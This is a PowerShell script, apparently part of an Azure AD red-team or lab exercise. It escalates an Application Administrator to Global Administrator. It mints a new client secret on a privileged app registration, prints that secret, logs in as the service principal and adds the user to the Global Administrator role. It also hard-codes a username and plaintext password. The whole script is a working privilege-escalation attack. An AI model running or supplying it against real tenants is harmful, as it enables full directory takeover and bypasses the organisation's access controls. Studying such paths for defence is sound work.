# Step 2.1:  Setup variables for the target and privilege escalation from recon script 
# Set the objectID of the target GA's app registration, from step 1.3
# Set the AppId of the target GA's app registration from Step 1.3
# Set the tenantId from Step 1.3

$targetObjectId = "80a392fb-887e-42e0-ba14-14b450cb3e77" 
$azureApplicationId = "93343b59-1dfd-456d-858b-60192f0c66f3" 
$tenantId = "1a82558d-66e0-48b0-b370-72df4caf1852" 

# Step 2.2:  Connect with the Azure AD user assigned to Application Administrator role
$appadmin_username = "tinahoward@rtcfingroup.com"
$appadmin_password = "endless-stork-EgvN"
$securepassword = ConvertTo-SecureString "$appadmin_password" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($appadmin_username, $securepassword)
Connect-AzureAD -Credential $credential

# Step 2.3:  Generate a new client secret for the app registration target
# Generate a new client secret for the app registration target
$AppKeyCred = New-AzureADApplicationPasswordCredential -ObjectId $targetObjectId

# Print new client secret
$secret = $AppKeyCred.value
Write-Host("New secret: $secret")

# Step 2.3:  Disconnect AzureAD
Disconnect-AzureAD

# Step 2.4:  Generate a new PSCred object for the secret
$azurePassword = ConvertTo-SecureString $secret -AsPlainText -Force
$PSCred = New-Object System.Management.Automation.PSCredential($azureApplicationId, $azurePassword)

# Step 2.5:  Connect-AzAccount
Connect-AzAccount -Credential $PSCred -TenantId $tenantId -ServicePrincipal

# Step 2.6: Create a context and aad Token
$context = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile.DefaultContext

$aadToken = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate($context.Account, $context.Environment, $context.Tenant.id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, "https://graph.windows.net").AccessToken

# Step 2.7:  Connect to Azure AD with the aad token and context
Connect-AzureAD -AadAccessToken $aadToken -AccountId $context.Account.Id -TenantId $context.tenant.Id

# Step 2.7:  Grant GA to our Application administrator user
# Get the ObjectId for Global Administrator role
$gaRole = Get-AzureADDirectoryRole | ?{$_.DisplayName -eq 'Global Administrator'} | select DisplayName, ObjectId,RoleTemplateId
$gaObjectId = $gaRole.ObjectId

# See that our Application Admin is not listed for the GA role assignment
get-AzureADDirectoryRoleMember -ObjectId $gaObjectId | select Objectid,DisplayName

# Get the objectId of our application admin that we want to elevate to GA
$appAdmin = Get-AzureADUser | ?{$_.userprincipalname -eq $appadmin_username}
$appadminobjectId = $appAdmin.ObjectId

# Add the GA role to our application admin, based on object IDs
Add-AzureADDirectoryRoleMember -RefObjectId $appadminobjectId -ObjectId $gaObjectId 

# See that our Application Admin is now listed for the GA role assignment
get-AzureADDirectoryRoleMember -ObjectId $gaObjectId | select Objectid,DisplayName
